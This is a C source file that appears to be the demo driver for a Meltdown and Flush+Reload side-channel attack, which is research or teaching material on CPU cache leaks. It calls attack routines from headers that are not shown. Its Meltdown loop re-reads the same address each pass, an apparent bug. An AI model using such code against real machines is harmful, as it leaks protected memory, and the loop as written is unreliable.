#include "meltdown.h"
#include "fr.h"
#include <stdio.h>
#include <stdint.h>
#include <string.h>

void flush_reload_demo(const char *secret) {
    FlushReload channel = fr_init();

    printf("The following secret was extracted from the transmission: ");
    for (size_t i = 0; i < strlen(secret); i++) {
        fr_reset(&channel);

        fr_leak(&channel, secret[i]);
        const uint8_t guessed_secret = fr_get(&channel);

        printf("%c", guessed_secret);
    }

    printf("\n");
    fr_free(&channel);
}

void meltdown_demo(const char *secret) {
    MeltdownUS meltdown_attack = meltdown_init();

    printf("The following secret was extracted from memory: ");
    for (size_t i = 0; i < strlen(secret); i++) {
        const uint8_t read_secret = meltdown_read_any(&meltdown_attack, (const uint8_t *) secret);
        printf("%c", read_secret);
    }

    printf("\n");
    meltdown_free(&meltdown_attack);
}

int main(int argc, char *argv[]) {
    if (argc > 2 && strcmp(argv[1], "flush+reload") == 0) {
        flush_reload_demo(argv[2]);
    } else if (argc > 2 && strcmp(argv[1], "meltdown") == 0) {
        meltdown_demo(argv[2]);
    } else {
        printf("First input either 'flush+reload' or 'meltdown' and then define the secret to transmit/extract.\n");
    }
}
